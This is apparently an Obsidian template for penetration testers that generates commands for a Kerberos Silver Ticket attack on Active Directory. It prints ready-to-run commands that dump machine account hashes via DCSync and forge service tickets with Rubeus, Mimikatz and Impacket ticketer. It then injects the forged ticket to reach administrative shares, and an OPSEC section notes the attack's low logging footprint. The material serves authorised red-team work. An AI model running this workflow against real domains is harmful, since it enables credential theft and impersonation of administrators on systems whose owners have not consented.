---
# Attack-specific fields
target_service: cifs
target_host:
target_host_fqdn:
target_computer_ntlm:
target_computer_aes256:
impersonate_user:
silver_ticket:
notes:
---

# Silver Ticket

> [!abstract] Attack Summary
> A **Silver Ticket** is a forged **TGS (service ticket)** signed with the **service account's hash** (often a computer account hash). Unlike Golden Tickets, Silver Tickets bypass the KDC entirely — they go directly to the target service. They are limited to a specific service on a specific machine, but are stealthier.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",     b?.domain     ?? "—"],
  ["Domain SID", b?.domain_sid ?? "—"],
  ["Username",   b?.username   ?? "—"],
  ["OS Env",     b?.os_env     ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();

const services = ["cifs","http","wsman","rpcss","host","ldap","mssqlsvc"];
const svcOptions = services.map(s => `option(${s})`).join(',');
const svcSelect = `\`INPUT[inlineSelect(defaultValue(${p.target_service ?? 'cifs'}),${svcOptions}):target_service]\``;

dv.table(["Field", "Value"], [
  ["Target Service",               svcSelect],
  ["Target Host (short)",          `\`INPUT[text:target_host]\``],
  ["Target Host FQDN",             `\`INPUT[text:target_host_fqdn]\``],
  ["Computer Account NTLM Hash",   `\`INPUT[text:target_computer_ntlm]\``],
  ["Computer Account AES-256",     `\`INPUT[text:target_computer_aes256]\``],
  ["User to Impersonate",          `\`INPUT[text(defaultValue("${p.impersonate_user ?? 'administrator'}")):impersonate_user]\``],
]);
```

---

## Step 1 — Obtain the Service Account / Computer Hash

> [!info] For services running as the computer account (CIFS, WinRM, etc.), you need the **machine account** NTLM or AES hash. Use DCSync, LSASS dump, or Mimikatz sekurlsa to get it.

**Windows — DCSync for machine account**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain     = b?.domain ?? "DOMAIN";
const targetHost = p?.target_host ?? "TARGET_HOST";
const shortDomain = domain.split('.')[0].toUpperCase();
dv.paragraph("```bash\n# From a Domain Admin context\ndcsync " + domain + " " + shortDomain + "\\" + targetHost + "$\n\n# Mimikatz\nlsadump::dcsync /domain:" + domain + " /user:" + targetHost + "$\n```");
```

Enter machine NTLM hash: `INPUT[text:target_computer_ntlm]`
Enter machine AES-256 hash: `INPUT[text:target_computer_aes256]`

---

## Step 2 — Forge the Silver Ticket

**Windows — Rubeus**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain     ?? "domain.local";
const sid         = b?.domain_sid ?? "S-1-5-21-REPLACE";
const service     = p?.target_service ?? "cifs";
const targetFqdn  = p?.target_host_fqdn || "TARGET.domain.local";
const ntlm        = p?.target_computer_ntlm  || "NTLM_HASH";
const aes256      = p?.target_computer_aes256 || "AES256_HASH";
const impersonate = p?.impersonate_user || "administrator";

dv.paragraph("```bash\n# Forge with AES-256 (preferred)\nC:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe silver " +
  "/service:" + service + "/" + targetFqdn +
  " /aes256:" + aes256 +
  " /user:" + impersonate +
  " /domain:" + domain +
  " /sid:" + sid +
  " /nowrap\n\n# Forge with NTLM/RC4\nC:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe silver " +
  "/service:" + service + "/" + targetFqdn +
  " /rc4:" + ntlm +
  " /user:" + impersonate +
  " /domain:" + domain +
  " /sid:" + sid +
  " /nowrap\n```");
```

**Windows — Mimikatz**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain     ?? "domain.local";
const sid         = b?.domain_sid ?? "S-1-5-21-REPLACE";
const service     = p?.target_service ?? "cifs";
const targetHost  = p?.target_host    || "TARGET";
const ntlm        = p?.target_computer_ntlm || "NTLM_HASH";
const impersonate = p?.impersonate_user || "administrator";
dv.paragraph("```bash\nkerberos::golden /user:" + impersonate + " /domain:" + domain + " /sid:" + sid +
  " /target:" + (p?.target_host_fqdn || targetHost + "." + domain) +
  " /service:" + service + " /rc4:" + ntlm + " /ticket:silver.kirbi\n```");
```

**Linux — Impacket ticketer**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain     ?? "domain.local";
const sid         = b?.domain_sid ?? "S-1-5-21-REPLACE";
const service     = p?.target_service ?? "cifs";
const targetFqdn  = p?.target_host_fqdn || "TARGET.domain.local";
const ntlm        = p?.target_computer_ntlm || "NTLM_HASH";
const impersonate = p?.impersonate_user || "administrator";
dv.paragraph("```bash\nimpacket-ticketer -nthash " + ntlm + " -domain " + domain + " -domain-sid " + sid +
  " -spn '" + service + "/" + targetFqdn + "' " + impersonate + "\n\nexport KRB5CCNAME=" + impersonate + ".ccache\n```");
```

Paste silver ticket: `INPUT[text:silver_ticket]`

---

## Step 3 — Import and Use the Ticket

**Windows**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "DOMAIN";
const shortDomain = domain.split('.')[0].toUpperCase();
const impersonate = p?.impersonate_user || "administrator";
const ticket      = p?.silver_ticket    || "BASE64_TICKET";
const targetFqdn  = p?.target_host_fqdn || "TARGET.domain.local";
const service     = p?.target_service   || "cifs";

dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe createnetonly " +
  "/program:C:\\Windows\\System32\\cmd.exe /domain:" + shortDomain +
  " /username:" + impersonate + " /password:FakePass /ticket:" + ticket + "\n\nsteal_token PID\n\n# Test access (FQDN required)\nls \\\\" + targetFqdn + "\\c$\n```");
```

---

## Common Service Targets

| Service | SPN Format | Access Gained |
|---|---|---|
| CIFS | `cifs/host.domain.local` | File shares, file operations |
| WinRM | `http/host.domain.local` | PowerShell remoting |
| WMI | `host/host.domain.local` | WMI remote execution |
| MSSQL | `MSSQLSvc/host.domain.local:1433` | SQL Server access |
| LDAP | `ldap/dc.domain.local` | DCSync, LDAP queries |
| RDP | `termsrv/host.domain.local` | Remote desktop |

---

## OPSEC

> [!warning] Detection Indicators
> - Silver tickets bypass the KDC — **no 4768/4769 events** are generated for the forged ticket.
> - Service-level event logs may show the impersonated user accessing resources.
> - Machine account passwords rotate every 30 days by default — Silver Tickets become invalid after rotation.
> - Anomalous access patterns (service accessed outside business hours, unusual user) can still alert.

---

## Notes & Results

`INPUT[textarea:notes]`
